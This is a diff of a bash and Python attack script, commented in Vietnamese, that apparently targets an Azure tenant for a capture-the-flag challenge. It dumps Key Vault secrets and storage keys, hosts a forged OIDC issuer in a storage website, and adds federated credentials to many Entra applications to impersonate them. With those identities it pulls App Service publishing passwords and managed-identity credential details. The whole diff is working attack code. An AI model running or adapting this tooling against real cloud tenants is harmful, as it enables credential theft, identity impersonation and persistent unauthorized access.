@@ -1,13 +1,19 @@
 #!/usr/bin/env bash
-# v17 — enumerate resource group THỨ HAI (rg-tbl-reporting-prod-eus) + mọi RG khác,
-#        bằng cả 14 app (FIC tạm). Tìm vault/storage/MI ở đó.
+# v18 — KIỂM CHỨNG giả thuyết hậu kiểm:
+#   Giả thuyết: app-tbl-reporting-prod nằm ở rg-tbl-reporting-prod-eus (KHÔNG phải -sea).
+#   v15 gọi sai RG nên publishxml "fail" — không phải do thiếu quyền.
+#   Test: gọi publishxml + publishingcredentials/list + sites/read trên ĐÚNG path,
+#         bằng 6 SP (client_secret) và 14 app (FIC). Cộng thêm liệt kê FIC của MI.
 set +e
 TEN="${AZURE_TENANT_ID}"; SUB="${AZURE_SUBSCRIPTION_ID}"
-RG=rg-tbl-platform-prod-sea; SA=sttblcilogsprodx3euoz
-PROD=kv-tbl-prod-x3euoz
+RG_SEA=rg-tbl-platform-prod-sea
+RG_EUS=rg-tbl-reporting-prod-eus
+SITE=app-tbl-reporting-prod
+MI=id-tbl-reporting-writer
+SA=sttblcilogsprodx3euoz; PROD=kv-tbl-prod-x3euoz
 AUTO_APP=462d1c38-4459-48b8-9333-82e389e59514
 HOST="https://$SA.z23.web.core.windows.net"
-PFX="htx-$RANDOM$RANDOM"; SUBJECT="tbl-solver-htx"
+PFX="hx-$RANDOM$RANDOM"; SUBJECT="tbl-verify-htx"
 
 gh_tok(){ curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
   "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$1" | python3 -c "import sys,json;print(json.load(sys.stdin)['value'])"; }
@@ -23,29 +29,48 @@ tok_sp(){ curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/t
 
 GHTOK=$(gh_tok "api://AzureADTokenExchange")
 KV=$(tok_fed "https://vault.azure.net/.default" "$GHTOK")
-ASEC=$(curl -sS -H "Authorization: Bearer $KV" \
-  "https://$PROD.vault.azure.net/secrets/sync-service-principal?api-version=7.4" \
-  | python3 -c "
-import sys,json;print(json.loads(json.load(sys.stdin)['value'])['clientSecret'])")
+ARM_CI=$(tok_fed "https://management.azure.com/.default" "$GHTOK")
+curl -sS -H "Authorization: Bearer $KV" "https://$PROD.vault.azure.net/secrets?api-version=7.4" > /tmp/l.json
+: > /tmp/sps.txt
+for ID in $(python3 -c "
+import json;print('\n'.join(s['id'] for s in json.load(open('/tmp/l.json')).get('value',[])))"); do
+  curl -sS -H "Authorization: Bearer $KV" "$ID?api-version=7.4" > /tmp/s.json
+  python3 - "${ID##*/}" <<'PY' >> /tmp/sps.txt
+import json,sys
+try:
+    v=json.loads(json.load(open("/tmp/s.json"))["value"])
+    print(sys.argv[1], v.get("appId",""), v.get("clientSecret",""))
+except Exception: pass
+PY
+done
+ASEC=$(awk '$1=="sync-service-principal"{print $3}' /tmp/sps.txt)
 G=$(tok_sp "$AUTO_APP" "$ASEC" "https://graph.microsoft.com/.default")
 ARMA=$(tok_sp "$AUTO_APP" "$ASEC" "https://management.azure.com/.default")
 KEY0=$(curl -sS -X POST -H "Authorization: Bearer $ARMA" -H "Content-Length: 0" \
-  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/$SA/listKeys?api-version=2023-01-01" \
+  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG_SEA/providers/Microsoft.Storage/storageAccounts/$SA/listKeys?api-version=2023-01-01" \
   | python3 -c "
 import sys,json;print(json.load(sys.stdin)['keys'][0]['value'])")
 curl -sS -H "Authorization: Bearer $G" \
   "https://graph.microsoft.com/v1.0/applications?\$top=100&\$select=id,appId,displayName" > /tmp/apps.json
+echo "[*] prefix=$PFX graph=${#G} key=${#KEY0}"
+
+echo "================ A. ĐỐI CHỨNG: cùng SP, hai RG ================"
+for RGX in "$RG_SEA" "$RG_EUS"; do
+  echo "--- RG=$RGX  site=$SITE (dùng ARM của tbl-platform-automation)"
+  curl -sS -o /tmp/o -w '  http=%{http_code}\n' -X POST -H "Authorization: Bearer $ARMA" -H "Content-Length: 0" \
+    "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RGX/providers/Microsoft.Web/sites/$SITE/publishxml?api-version=2022-03-01"
+  head -c 220 /tmp/o; echo
+done
 
 pip -q install azure-storage-blob pyjwt cryptography >/dev/null 2>&1
-python3 - "$SA" "$KEY0" "$HOST" "$PFX" "$SUBJECT" "$TEN" "$SUB" "$G" <<'PY'
+python3 - "$SA" "$KEY0" "$HOST" "$PFX" "$SUBJECT" "$TEN" "$SUB" "$RG_EUS" "$SITE" "$MI" "$G" <<'PY'
 import sys,json,time,uuid,base64,urllib.request,urllib.parse,re
 from azure.storage.blob import BlobServiceClient, ContentSettings
 from cryptography.hazmat.primitives.asymmetric import rsa
 from cryptography.hazmat.primitives import serialization
 import jwt
-sa,key0,host,pfx,subject,ten,sub,graph = sys.argv[1:9]
-ISS=f"{host}/{pfx}"
-FLAG=re.compile(r'DF26\{[^}]*\}')
+sa,key0,host,pfx,subject,ten,sub,rg,site,mi,graph = sys.argv[1:12]
+ISS=f"{host}/{pfx}"; B="https://management.azure.com"
 svc=BlobServiceClient(f"https://{sa}.blob.core.windows.net",credential=key0)
 web=svc.get_container_client("$web")
 priv=rsa.generate_private_key(public_exponent=65537,key_size=2048)
@@ -60,15 +85,19 @@ ct=ContentSettings(content_type="application/json")
 for p,b in ((f"{pfx}/jwks.json",JS),(f"{pfx}/.well-known/jwks.json",JS),(f"{pfx}/.well-known/openid-configuration",CFG)):
     web.upload_blob(p,b,overwrite=True,content_settings=ct)
 
-def api(url,method="GET",tok=graph,body=None):
+def api(url,method="GET",tok=graph,body=None,raw=False):
     d=json.dumps(body).encode() if body is not None else None
     r=urllib.request.Request(url,d,method=method,headers={"Authorization":"Bearer "+tok,"Content-Type":"application/json"})
     try:
         with urllib.request.urlopen(r,timeout=40) as f:
-            t=f.read(); return json.loads(t) if t else {}
+            t=f.read()
+            return t.decode(errors="replace") if raw else (json.loads(t) if t else {})
     except Exception as e:
-        try: return {"error":json.loads(e.read())}
-        except Exception: return {"error":str(e)[:90]}
+        try:
+            body=e.read().decode(errors="replace")
+            return ("ERR "+body[:160]) if raw else {"error":body[:160]}
+        except Exception:
+            return ("ERR "+str(e)[:90]) if raw else {"error":str(e)[:90]}
 def mint():
     n=int(time.time())
     return jwt.encode({"iss":ISS,"sub":subject,"aud":"api://AzureADTokenExchange","iat":n-60,
@@ -87,43 +116,45 @@ apps=json.load(open("/tmp/apps.json"))["value"]
 created=[]
 for a in apps:
     r=api(f"https://graph.microsoft.com/v1.0/applications/{a['id']}/federatedIdentityCredentials","POST",
-          body={"name":"tmp-"+pfx[:12],"issuer":ISS,"subject":subject,"audiences":["api://AzureADTokenExchange"]})
+          body={"name":"ver-"+pfx[:12],"issuer":ISS,"subject":subject,"audiences":["api://AzureADTokenExchange"]})
     if "error" not in r: created.append((a['id'],r.get("id"),a['appId'],a['displayName']))
 print("[*] FIC tạm:",len(created)); time.sleep(45)
 
-B="https://management.azure.com"
-best=None
+SITEBASE=f"{B}/subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.Web/sites/{site}"
+MIBASE=f"{B}/subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.ManagedIdentity/userAssignedIdentities/{mi}"
+print("================ B. publishxml / publishingcredentials trên RG ĐÚNG ================")
+hits=[]
 for oid,fid,appid,name in created:
     am=exchange(appid,B+"/.default")
     if not am: continue
-    rgs=api(f"{B}/subscriptions/{sub}/resourcegroups?api-version=2021-04-01",tok=am)
-    if "error" in rgs: continue
-    names=[g["name"] for g in rgs.get("value",[])]
-    print(f"  {name}: RGs = {names}")
-    if len(names)>1 and not best: best=(name,appid,am,names)
+    rd=api(SITEBASE+"?api-version=2022-03-01",tok=am)
+    px=api(SITEBASE+"/publishxml?api-version=2022-03-01","POST",tok=am,body={},raw=True)
+    pc=api(SITEBASE+"/config/publishingcredentials/list?api-version=2022-03-01","POST",tok=am,body={})
+    fx=api(MIBASE+"/federatedIdentityCredentials?api-version=2023-01-31",tok=am)
+    ok_read = "error" not in rd
+    ok_px   = isinstance(px,str) and "userName" in px
+    ok_pc   = "error" not in pc
+    ok_fx   = "error" not in fx
+    if ok_read or ok_px or ok_pc or ok_fx:
+        print(f"  >>> {name} ({appid}) read={ok_read} publishxml={ok_px} pubcreds={ok_pc} miFIC={ok_fx}")
+        hits.append((name,appid,px,pc,fx))
+    else:
+        print(f"      {name}: tất cả denied")
+if not hits: print("  [!] không danh tính nào chạm được resource ở RG này")
 
-if not best:
-    print("[!] không app nào thấy >1 RG");
-else:
-    name,appid,am,names=best
-    print(f"================ dùng {name} ================")
-    for g in names:
-        r=api(f"{B}/subscriptions/{sub}/resourceGroups/{g}/resources?api-version=2021-04-01",tok=am)
-        print(f"-- {g}:", json.dumps(r)[:1200])
-    # vault trong RG mới
-    r=api(f"{B}/subscriptions/{sub}/providers/Microsoft.KeyVault/vaults?api-version=2022-07-01",tok=am)
-    for v in r.get("value",[]):
-        vn=v["name"]; uri=v["properties"]["vaultUri"].rstrip('/')
-        kt=exchange(appid,"https://vault.azure.net/.default")
-        if not kt: continue
-        l=api(f"{uri}/secrets?api-version=7.4",tok=kt)
-        if "error" in l: print(f"   {vn}: denied"); continue
-        print(f"   {vn}: OK")
-        for s in l.get("value",[]):
-            gg=api(s["id"]+"?api-version=7.4",tok=kt)
-            val=str(gg.get("value",""))
-            f=FLAG.findall(val)
-            print("     ",s["id"].split('/')[-1],"=", ("*** FLAG "+str(f)) if f else val[:400])
+print("================ C. chi tiết ================")
+for name,appid,px,pc,fx in hits:
+    print(f"-- {name}")
+    if isinstance(px,str) and "userName" in px:
+        m=re.search(r'userName="([^"]+)"[^>]*userPWD="([^"]+)"',px)
+        print("   publishxml user =", m.group(1) if m else "?")
+    if isinstance(pc,dict) and "error" not in pc:
+        p=pc.get("properties",pc)
+        print("   pubcreds user =", p.get("publishingUserName"), "scm =", p.get("scmUri","")[:60])
+    if isinstance(fx,dict) and "error" not in fx:
+        for f in fx.get("value",[]):
+            pr=f.get("properties",f)
+            print("   MI-FIC:",f.get("name"),"| iss=",pr.get("issuer"),"| sub=",pr.get("subject"),"| aud=",pr.get("audiences"))
 
 print("[*] dọn dẹp")
 for oid,fid,appid,name in created:
